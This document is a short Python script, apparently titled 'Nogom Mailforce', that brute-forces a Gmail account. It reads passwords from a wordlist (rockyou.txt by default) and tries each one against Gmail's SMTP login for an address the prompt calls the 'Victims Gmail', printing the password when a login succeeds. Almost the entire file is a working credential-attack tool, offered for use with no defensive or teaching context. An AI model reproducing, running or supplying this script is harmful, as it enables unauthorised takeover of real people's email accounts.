import smtplib
import sys
from os import system
def nogom():
	print("███╗░░██╗░█████╗░░██████╗░░█████╗░███╗░░░███╗")
	print("████╗░██║██╔══██╗██╔════╝░██╔══██╗████╗░████║")
	print("██╔██╗██║██║░░██║██║░░██╗░██║░░██║██╔████╔██║")
	print("██║╚████║██║░░██║██║░░╚██╗██║░░██║██║╚██╔╝██║")
	print("██║░╚███║╚█████╔╝╚██████╔╝╚█████╔╝██║░╚═╝░██║")
	print("╚═╝░░╚══╝░╚════╝░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝")
	print("█▀▄▀█ ▄▀█ █ █░░ █▀▀ █▀█ █▀█ █▀▀ █▀▀")
	print("█░▀░█ █▀█ █ █▄▄ █▀░ █▄█ █▀▄ █▄▄ ██▄")
nogom()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = input("Victims Gmail:")

print("\n")

pwd = input("Enter 'n' for server Saved password crack \nEnter 'y' to Add a custom password location\n nogom~~~~~~~:)")

if pwd=='n':
    passswfile="rockyou.txt"

elif pwd=='y':
    print("\n")
    passswfile = input("Password Location(Nogom/location.txt)~~ ")

else:
    print("\n")
    print("Invalid input!")
    
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Pasword Is Wrong. %s " % password)

	